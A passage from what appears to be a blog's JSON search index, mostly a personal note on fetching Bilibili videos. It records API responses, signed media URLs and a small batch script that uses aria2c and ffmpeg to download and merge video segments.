android:layout_height=\u0026#34;64dp\u0026#34;/\u0026gt; \u0026lt;LinearLayout android:paddingStart=\u0026#34;4dp\u0026#34; android:paddingEnd=\u0026#34;0dp\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;TextView android:gravity=\u0026#34;center_vertical\u0026#34; android:id=\u0026#34;@+id/title\u0026#34; android:maxLines=\u0026#34;1\u0026#34; android:text=\u0026#34;New Text\u0026#34; android:textSize=\u0026#34;15sp\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34;/\u0026gt; \u0026lt;TextView android:gravity=\u0026#34;center_vertical\u0026#34; android:id=\u0026#34;@+id/content\u0026#34; android:maxLines=\u0026#34;3\u0026#34; android:text=\u0026#34;New Text\u0026#34; android:textSize=\u0026#34;12sp\u0026#34; android:layout_weight=\u0026#34;1\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; \u0026lt;/LinearLayout\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-listview/","summary":"","title":"Android 异步加载"},{"content":"Updated on 2016-09-18\nGetBilibili\nhttp://www.bilibili.com/video/av5262155/\nhttp://interface.bilibili.com/player?id=cid:8551612 \u0026lt;ip\u0026gt;221.7.77.107\u0026lt;/ip\u0026gt; \u0026lt;zoneid\u0026gt;151404674\u0026lt;/zoneid\u0026gt; \u0026lt;country\u0026gt;中国\u0026lt;/country\u0026gt; \u0026lt;isp\u0026gt;联通\u0026lt;/isp\u0026gt; \u0026lt;login\u0026gt;true\u0026lt;/login\u0026gt; \u0026lt;name\u0026gt;XhstormR [中国]\u0026lt;/name\u0026gt; \u0026lt;user\u0026gt;1824443\u0026lt;/user\u0026gt; \u0026lt;scores\u0026gt;5580\u0026lt;/scores\u0026gt; \u0026lt;money\u0026gt;793\u0026lt;/money\u0026gt; \u0026lt;face\u0026gt;http://i1.hdslb.com/bfs/face/df2cca3b4649ba7057583cd662daba034efd82f2.jpg\u0026lt;/face\u0026gt; \u0026lt;pwd\u0026gt;undefined\u0026lt;/pwd\u0026gt; \u0026lt;isadmin\u0026gt;true\u0026lt;/isadmin\u0026gt; \u0026lt;permission\u0026gt;10000,1001\u0026lt;/permission\u0026gt; \u0026lt;time\u0026gt;1474189543\u0026lt;/time\u0026gt; \u0026lt;rank\u0026gt;10000\u0026lt;/rank\u0026gt; \u0026lt;level\u0026gt;正式会员\u0026lt;/level\u0026gt; \u0026lt;level_info\u0026gt;{\u0026#34;current_level\u0026#34;:4,\u0026#34;current_min\u0026#34;:4500,\u0026#34;current_exp\u0026#34;:7441,\u0026#34;next_exp\u0026#34;:10800}\u0026lt;/level_info\u0026gt; \u0026lt;vip\u0026gt;{\u0026#34;vipType\u0026#34;:0,\u0026#34;vipDueDate\u0026#34;:0,\u0026#34;dueRemark\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;accessStatus\u0026#34;:1,\u0026#34;vipStatus\u0026#34;:0,\u0026#34;vipStatusWarn\u0026#34;:\u0026#34;\u0026#34;}\u0026lt;/vip\u0026gt; \u0026lt;official_verify\u0026gt;{\u0026#34;type\u0026#34;:-1,\u0026#34;desc\u0026#34;:\u0026#34;\u0026#34;}\u0026lt;/official_verify\u0026gt; \u0026lt;shot\u0026gt;false\u0026lt;/shot\u0026gt; \u0026lt;suggest_comment\u0026gt;false\u0026lt;/suggest_comment\u0026gt; \u0026lt;maxlimit\u0026gt;1000\u0026lt;/maxlimit\u0026gt; \u0026lt;chatid\u0026gt;8551612\u0026lt;/chatid\u0026gt; \u0026lt;server\u0026gt;chat.bilibili.com\u0026lt;/server\u0026gt; \u0026lt;vtype\u0026gt;vupload\u0026lt;/vtype\u0026gt; \u0026lt;aid\u0026gt;5262155\u0026lt;/aid\u0026gt; \u0026lt;typeid\u0026gt;82\u0026lt;/typeid\u0026gt; \u0026lt;pid\u0026gt;1\u0026lt;/pid\u0026gt; \u0026lt;click\u0026gt;97\u0026lt;/click\u0026gt; \u0026lt;favourites\u0026gt;1\u0026lt;/favourites\u0026gt; \u0026lt;credits\u0026gt;0\u0026lt;/credits\u0026gt; \u0026lt;coins\u0026gt;0\u0026lt;/coins\u0026gt; \u0026lt;fw_click\u0026gt;4\u0026lt;/fw_click\u0026gt; \u0026lt;duration\u0026gt;4:43\u0026lt;/duration\u0026gt; \u0026lt;arctype\u0026gt;Copy\u0026lt;/arctype\u0026gt; \u0026lt;danmu\u0026gt;0\u0026lt;/danmu\u0026gt; \u0026lt;bottom\u0026gt;0\u0026lt;/bottom\u0026gt; \u0026lt;sinapi\u0026gt;1\u0026lt;/sinapi\u0026gt; \u0026lt;acceptguest\u0026gt;true\u0026lt;/acceptguest\u0026gt; \u0026lt;acceptaccel\u0026gt;false\u0026lt;/acceptaccel\u0026gt; http://interface.bilibili.com/count?key=27f582250563d5d6b11d6833\u0026amp;aid=5262155 111;$(\u0026#39;#dianji\u0026#39;).html(\u0026#39;97\u0026#39;);$(\u0026#39;#stow_count\u0026#39;).html(\u0026#39;1\u0026#39;);$(\u0026#39;#v_ctimes\u0026#39;).html(0);$(\u0026#39;.v_ctimes\u0026#39;).html(0);$(\u0026#39;#dm_count\u0026#39;).html(0);$(\u0026#39;.dm_count\u0026#39;).html(0); http://www.bilibili.com/widget/getPageList?aid=4044639 [ { \u0026#34;page\u0026#34;:1, \u0026#34;pagename\u0026#34;:\u0026#34;01 \\u6df1\\u5177\\u4f20\\u7edf\\u7684\\u53e4\\u5178\\u6587\\u5b66\\u90e8\\u4e4b\\u91cd\\u751f\u0026#34;, \u0026#34;cid\u0026#34;:6525010 }, { \u0026#34;page\u0026#34;:2, \u0026#34;pagename\u0026#34;:\u0026#34;02 \\u503c\\u5f97\\u5938\\u8000\\u7684\\u53e4\\u5178\\u6587\\u5b66\\u90e8\\u4e4b\\u6d3b\\u52a8\u0026#34;, \u0026#34;cid\u0026#34;:6525011 }, { \u0026#34;page\u0026#34;:3, \u0026#34;pagename\u0026#34;:\u0026#34;03 \\u53e6\\u6709\\u9690\\u60c5\\u7684\\u53e4\\u5178\\u6587\\u5b66\\u90e8\\u4e4b\\u540e\\u88d4\u0026#34;, \u0026#34;cid\u0026#34;:6525012 }, { \u0026#34;page\u0026#34;:4, \u0026#34;pagename\u0026#34;:\u0026#34;04 \\u7efd\\u653e\\u8363\\u5149\\u7684\\u53e4\\u5178\\u6587\\u5b66\\u90e8\\u4e4b\\u8fc7\\u5f80\u0026#34;, \u0026#34;cid\u0026#34;:6525013 }, { \u0026#34;page\u0026#34;:5, \u0026#34;pagename\u0026#34;:\u0026#34;05 \\u72ec\\u5177\\u5386\\u53f2\\u7684\\u53e4\\u5178\\u6587\\u5b66\\u90e8\\u4e4b\\u771f\\u76f8\u0026#34;, \u0026#34;cid\u0026#34;:6525014 }, { \u0026#34;page\u0026#34;:6, \u0026#34;pagename\u0026#34;:\u0026#34;06 \\u72af\\u4e0b\\u5927\\u7f6a\u0026#34;, \u0026#34;cid\u0026#34;:6525015 }, { \u0026#34;page\u0026#34;:7, \u0026#34;pagename\u0026#34;:\u0026#34;07 \\u521d\\u89c1\\u771f\\u8eab\u0026#34;, \u0026#34;cid\u0026#34;:6525016 }, { \u0026#34;page\u0026#34;:8, \u0026#34;pagename\u0026#34;:\u0026#34;08 \\u53bb\\u53c2\\u52a0\\u8bd5\\u6620\\u4f1a\\u5427\\uff01\u0026#34;, \u0026#34;cid\u0026#34;:6525017 }, { \u0026#34;page\u0026#34;:9, \u0026#34;pagename\u0026#34;:\u0026#34;09 \\u53e4\\u4e18\\u5e9f\\u6751\\u6740\\u4eba\\u4e8b\\u4ef6\u0026#34;, \u0026#34;cid\u0026#34;:6525018 }, { \u0026#34;page\u0026#34;:10, \u0026#34;pagename\u0026#34;:\u0026#34;10 \\u4e07\\u4eba\\u7684\\u6b7b\\u89d2\u0026#34;, \u0026#34;cid\u0026#34;:6525019 }, { \u0026#34;page\u0026#34;:11, \u0026#34;pagename\u0026#34;:\u0026#34;11 \\u611a\\u8005\\u7684\\u7247\\u5c3e\u0026#34;, \u0026#34;cid\u0026#34;:6525020 }, { \u0026#34;page\u0026#34;:12, \u0026#34;pagename\u0026#34;:\u0026#34;11.5 \\u5e94\\u6301\\u4e4b\\u7269\u0026#34;, \u0026#34;cid\u0026#34;:6525021 }, { \u0026#34;page\u0026#34;:13, \u0026#34;pagename\u0026#34;:\u0026#34;12 \\u65e0\\u9650\\u5806\\u79ef\\u7684\\u300c\\u90a3\\u4e2a\\u300d\u0026#34;, \u0026#34;cid\u0026#34;:6525022 }, { \u0026#34;page\u0026#34;:14, \u0026#34;pagename\u0026#34;:\u0026#34;13 \\u9ec4\\u660f\\u73b0\\u767d\\u9aa8\u0026#34;, \u0026#34;cid\u0026#34;:6525023 }, { \u0026#34;page\u0026#34;:15, \u0026#34;pagename\u0026#34;:\u0026#34;14 \\u91ce\\u706b\u0026#34;, \u0026#34;cid\u0026#34;:6525024 }, { \u0026#34;page\u0026#34;:16, \u0026#34;pagename\u0026#34;:\u0026#34;15 \\u5341\\u6587\\u5b57\\u4e8b\\u4ef6\u0026#34;, \u0026#34;cid\u0026#34;:6525025 }, { \u0026#34;page\u0026#34;:17, \u0026#34;pagename\u0026#34;:\u0026#34;16 \\u6700\\u540e\\u7684\\u76ee\\u6807\u0026#34;, \u0026#34;cid\u0026#34;:6525026 }, { \u0026#34;page\u0026#34;:18, \u0026#34;pagename\u0026#34;:\u0026#34;17 \\u5e93\\u7279\\u5229\\u4e9a\\u8299\\u5361\\u7684\\u6392\\u5e8f\u0026#34;, \u0026#34;cid\u0026#34;:6525027 }, { \u0026#34;page\u0026#34;:19, \u0026#34;pagename\u0026#34;:\u0026#34;18 \\u5cf0\\u5ce6\\u80fd\\u5426\\u653e\\u6674\u0026#34;, \u0026#34;cid\u0026#34;:6525028 }, { \u0026#34;page\u0026#34;:20, \u0026#34;pagename\u0026#34;:\u0026#34;19 \\u76f8\\u5173\\u4eba\\u5458\u0026#34;, \u0026#34;cid\u0026#34;:6525029 }, { \u0026#34;page\u0026#34;:21, \u0026#34;pagename\u0026#34;:\u0026#34;20 \\u5f00\\u95e8\\u5feb\\u4e50\u0026#34;, \u0026#34;cid\u0026#34;:6525030 }, { \u0026#34;page\u0026#34;:22, \u0026#34;pagename\u0026#34;:\u0026#34;21 \\u624b\\u5236\\u5de7\\u514b\\u529b\\u4e8b\\u4ef6\u0026#34;, \u0026#34;cid\u0026#34;:6525031 }, { \u0026#34;page\u0026#34;:23, \u0026#34;pagename\u0026#34;:\u0026#34;22 \\u7ed5\\u8fdc\\u7684\\u5076\\u4eba\u0026#34;, \u0026#34;cid\u0026#34;:6525032 } ] http://www.bilibili.com/m/html5?aid=5262155\u0026amp;page=1 { \u0026#34;img\u0026#34;:\u0026#34;http://i2.hdslb.com/bfs/archive/8aeeb95c288b51c18c17cf0d1bf777b1107fc95b.jpg\u0026#34;, \u0026#34;cid\u0026#34;:\u0026#34;http://comment.bilibili.com/8551612.xml\u0026#34;, \u0026#34;src\u0026#34;:\u0026#34;http://cn-cq1-cu.acgvideo.com/vg1/8/ca/8551612-1.mp4?expires=1474268100\u0026amp;ssig=5hl71UMv4NXLbthQKpIUYw\u0026amp;oi=3708243307\u0026amp;internal=1\u0026amp;rate=0\u0026#34; } http://interface.bilibili.com/playurl?cid=8551612\u0026amp;appkey=6f90a59ac58a4123\u0026amp;otype=json\u0026amp;type=flv\u0026amp;quality=3\u0026amp;sign=6a43d8cd634b31d0f6863509d41ccde0 { \u0026#34;from\u0026#34;:\u0026#34;local\u0026#34;, \u0026#34;result\u0026#34;:\u0026#34;suee\u0026#34;, \u0026#34;format\u0026#34;:\u0026#34;flv\u0026#34;, \u0026#34;timelength\u0026#34;:283324, \u0026#34;accept_format\u0026#34;:\u0026#34;mp4,hdmp4,flv\u0026#34;, \u0026#34;accept_quality\u0026#34;:[ 3, 2, 1 ], \u0026#34;seek_param\u0026#34;:\u0026#34;start\u0026#34;, \u0026#34;seek_type\u0026#34;:\u0026#34;offset\u0026#34;, \u0026#34;durl\u0026#34;:[ { \u0026#34;order\u0026#34;:1, \u0026#34;length\u0026#34;:283324, 毫秒 \u0026#34;size\u0026#34;:72450795, 字节 \u0026#34;url\u0026#34;:\u0026#34;http://cn-cq3-cu.acgvideo.com/vg2/8/a6/8551612-1.flv?expires=1474288500\u0026amp;ssig=GJ9c8OJUz3mZQT3OGT41UQ\u0026amp;oi=3708243307\u0026amp;rate=0\u0026#34;, \u0026#34;backup_url\u0026#34;:[ \u0026#34;http://cn-tj3-cu.acgvideo.com/vg6/a/9c/8551612-1.flv?expires=1474288500\u0026amp;ssig=ky9JegSFg9MwP-VBWMtBHw\u0026amp;oi=3708243307\u0026amp;rate=0\u0026#34;, \u0026#34;http://ws.acgvideo.com/0/22/8551612-1.flv?wsTime=1474288705\u0026amp;wsSecret2=4a18abf3b78cbcc277c5c1b814170bc2\u0026amp;oi=3708243307\u0026#34; ] } ] } 123.bat node 123.js \u0026gt; 123.txt aria2c.exe --input-file=123.txt --disk-cache=32M --enable-mmap=true --max-mmap-limit=2048M --continue=true --max-concurrent-downloads=1 --max-connection-per-server=16 --min-split-size=10M --split=20 --http-no-cache=true --user-agent=Windows --referer=https://www.bilibili.com/ --dir=123 busybox find 123 -type f | busybox xargs -I {} echo -i {} | busybox xargs D:\\Download\\ffmpeg.exe -c copy 123.mp4 -y 123.js var window = {} var json = window.__playinfo__ = {\u0026#34;code\u0026#34;:0,\u0026#34;ttl\u0026#34;:1,\u0026#34;message\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;accept_format\u0026#34;:\u0026#34;hdflv2,flv,flv720,flv480,flv360\u0026#34;,\u0026#34;code\u0026#34;:0,\u0026#34;seek_param\u0026#34;:\u0026#34;start\u0026#34;,\u0026#34;is_preview\u0026#34;:0,\u0026#34;fnval\u0026#34;:16,\u0026#34;video_project\u0026#34;:true,\u0026#34;fnver\u0026#34;:0,\u0026#34;type\u0026#34;:\u0026#34;DASH\u0026#34;,\u0026#34;bp\u0026#34;:0,\u0026#34;result\u0026#34;:\u0026#34;suee\u0026#34;,\u0026#34;seek_type\u0026#34;:\u0026#34;offset\u0026#34;,\u0026#34;vip_type\u0026#34;:1,\u0026#34;from\u0026#34;:\u0026#34;local\u0026#34;,\u0026#34;video_codecid\u0026#34;:7,\u0026#34;no_rexcode\u0026#34;:1,\u0026#34;format\u0026#34;:\u0026#34;hdflv2\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;accept_quality\u0026#34;:[112,80,64,32,16],\u0026#34;quality\u0026#34;:112,\u0026#34;timelength\u0026#34;:6033130,\u0026#34;has_paid\u0026#34;:true,\u0026#34;vip_status\u0026#34;:1,\u0026#34;dash\u0026#34;:{\u0026#34;duration\u0026#34;:6034,\u0026#34;minBufferTime\u0026#34;:1.5,\u0026#34;min_buffer_time\u0026#34;:1.5,\u0026#34;video\u0026#34;:[{\u0026#34;start_with_sap\u0026#34;:1,\u0026#34;bandwidth\u0026#34;:4004119,\u0026#34;sar\u0026#34;:\u0026#34;1:1\u0026#34;,\u0026#34;backupUrl\u0026#34;:[\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30112.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=980130f332833267d442e6bbc9d82338\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;],\u0026#34;codecs\u0026#34;:\u0026#34;avc1.640028\u0026#34;,\u0026#34;base_url\u0026#34;:\u0026#34;https://upos-hz-mirrorcosu.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30112.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=cosu\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=77b3ca211b9b7bee63fb2b2537ae5db6\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;,\u0026#34;backup_url\u0026#34;:[\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30112.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=980130f332833267d442e6bbc9d82338\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;],\u0026#34;segment_base\u0026#34;:{\u0026#34;initialization\u0026#34;:\u0026#34;0-973\u0026#34;,\u0026#34;index_range\u0026#34;:\u0026#34;974-9765\u0026#34;},\u0026#34;mimeType\u0026#34;:\u0026#34;video/mp4\u0026#34;,\u0026#34;frame_rate\u0026#34;:\u0026#34;16000/672\u0026#34;,\u0026#34;SegmentBase\u0026#34;:{\u0026#34;Initialization\u0026#34;:\u0026#34;0-973\u0026#34;,\u0026#34;indexRange\u0026#34;:\u0026#34;974-9765\u0026#34;},\u0026#34;frameRate\u0026#34;:\u0026#34;16000/672\u0026#34;,\u0026#34;codecid\u0026#34;:7,\u0026#34;baseUrl\u0026#34;:\u0026#34;https://upos-hz-mirrorcosu.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30112.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=cosu\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=77b3ca211b9b7bee63fb2b2537ae5db6\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;,\u0026#34;size\u0026#34;:0,\u0026#34;mime_type\u0026#34;:\u0026#34;video/mp4\u0026#34;,\u0026#34;width\u0026#34;:1920,\u0026#34;startWithSAP\u0026#34;:1,\u0026#34;id\u0026#34;:112,\u0026#34;height\u0026#34;:1040,\u0026#34;md5\u0026#34;:\u0026#34;\u0026#34;}],\u0026#34;audio\u0026#34;:[{\u0026#34;start_with_sap\u0026#34;:0,\u0026#34;bandwidth\u0026#34;:193670,\u0026#34;sar\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;backupUrl\u0026#34;:[\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=10daf7329479560272000492dd7d7eaa\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;],\u0026#34;codecs\u0026#34;:\u0026#34;mp4a.40.2\u0026#34;,\u0026#34;base_url\u0026#34;:\u0026#34;https://upos-hz-mirrorhw.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=hw\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=20728ef4ab0fb7b33203b554ede9dcb5\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;,\u0026#34;backup_url\u0026#34;:[\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=10daf7329479560272000492dd7d7eaa\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;],\u0026#34;segment_base\u0026#34;:{\u0026#34;initialization\u0026#34;:\u0026#34;0-907\u0026#34;,\u0026#34;index_range\u0026#34;:\u0026#34;908-15423\u0026#34;},\u0026#34;mimeType\u0026#34;:\u0026#34;audio/mp4\u0026#34;,\u0026#34;frame_rate\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;SegmentBase\u0026#34;:{\u0026#34;Initialization\u0026#34;:\u0026#34;0-907\u0026#34;,\u0026#34;indexRange\u0026#34;:\u0026#34;908-15423\u0026#34;},\u0026#34;frameRate\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;codecid\u0026#34;:0,\u0026#34;baseUrl\u0026#34;:\u0026#34;https://upos-hz-mirrorhw.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30280.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=hw\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=20728ef4ab0fb7b33203b554ede9dcb5\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;,\u0026#34;size\u0026#34;:0,\u0026#34;mime_type\u0026#34;:\u0026#34;audio/mp4\u0026#34;,\u0026#34;width\u0026#34;:0,\u0026#34;startWithSAP\u0026#34;:0,\u0026#34;id\u0026#34;:30280,\u0026#34;height\u0026#34;:0,\u0026#34;md5\u0026#34;:\u0026#34;\u0026#34;},{\u0026#34;start_with_sap\u0026#34;:0,\u0026#34;bandwidth\u0026#34;:67205,\u0026#34;sar\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;backupUrl\u0026#34;:[\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30216.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=efc6b85b33d839d5cc9df3a2a7a1120f\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;],\u0026#34;codecs\u0026#34;:\u0026#34;mp4a.40.2\u0026#34;,\u0026#34;base_url\u0026#34;:\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30216.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=efc6b85b33d839d5cc9df3a2a7a1120f\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;,\u0026#34;backup_url\u0026#34;:[\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30216.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b54e71584da39569p\u0026amp;platform=pc\u0026amp;upsig=efc6b85b33d839d5cc9df3a2a7a1120f\u0026amp;uparams=e,uipk,nbs,deadline,gen,os,oi,trid,platform\u0026amp;mid=133948365\u0026#34;],\u0026#34;segment_base\u0026#34;:{\u0026#34;initialization\u0026#34;:\u0026#34;0-907\u0026#34;,\u0026#34;index_range\u0026#34;:\u0026#34;908-15423\u0026#34;},\u0026#34;mimeType\u0026#34;:\u0026#34;audio/mp4\u0026#34;,\u0026#34;frame_rate\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;SegmentBase\u0026#34;:{\u0026#34;Initialization\u0026#34;:\u0026#34;0-907\u0026#34;,\u0026#34;indexRange\u0026#34;:\u0026#34;908-15423\u0026#34;},\u0026#34;frameRate\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;codecid\u0026#34;:0,\u0026#34;baseUrl\u0026#34;:\u0026#34;https://upos-hz-mirrorks3u.acgvideo.com/upgcxcode/51/73/48137351/48137351_da4-1-30216.m4s?e=ig8euxZM2rNcNbdlhoNvNC8BqJIzNbfqXBvEqxTEto8BTrNvN0GvT90W5JZMkX_YN0MvXg8gNEV4NC8xNEV4N03eN0B5tZlqNxTEto8BTrNvNeZVuJ10Kj_g2UB02J0mN0B5tZlqNCNEto8BTrNvNC7MTX502C8f2jmMQJ6mqF2fka1mqx6gqj0eN0B599M=\u0026amp;uipk=5\u0026amp;nbs=1\u0026amp;deadline=1575823389\u0026amp;gen=playurl\u0026amp;os=ks3u\u0026amp;oi=2085520452\u0026amp;trid=04f28450a4fd4b70b